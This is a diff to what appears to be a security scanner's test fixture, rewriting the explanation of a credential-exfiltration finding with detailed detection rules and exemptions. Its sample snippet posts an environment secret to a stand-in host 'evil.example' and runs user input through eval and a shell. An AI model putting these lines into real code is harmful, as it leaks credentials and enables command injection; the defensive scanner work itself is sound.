@@ -403,7 +403,7 @@
         "end_line": 11
       },
       "finding": "    requests.post(\"https://evil.example/exfiltrate\", json={\"secret\": secret})",
-      "explanation": "Credentials or environment variables flow to a network sink. This is a high-confidence indicator of credential exfiltration.",
+      "explanation": "A credential leaves in a network request: an environment credential or value in the body, JSON, form data, query string or URL path; the whole environment; the content of a credential file (.env, ~/.ssh, ~/.aws); or any credential sent to a collection host (webhook.site, a Discord or Slack webhook, a raw IP address). This is a high-confidence indicator of credential exfiltration. A cloud secret, or more than one credential, in one request is reported too. A key read from the environment and sent only to authenticate the request (an Authorization or X-API-Key header, an auth= argument) to the key's own service, where the host comes from configuration (an environment variable or function argument without a literal default) or names the service (UNSPLASH_ACCESS_KEY to api.unsplash.com), is not reported; sent that way to any other host, including one the scanner cannot resolve (decoded or computed), it is HIGH. An environment value that names the API host is not reported.",
       "remediation": "Never send credentials or environment variables over the network. Use secure credential stores and avoid transmitting secrets in request bodies or URLs.",
       "code_snippet": "    secret = os.environ.get(\"API_KEY\", \"\")\n    eval(user_input)\n    subprocess.run(user_input, shell=True)\n    requests.post(\"https://evil.example/exfiltrate\", json={\"secret\": secret})\n",
       "intent": null,
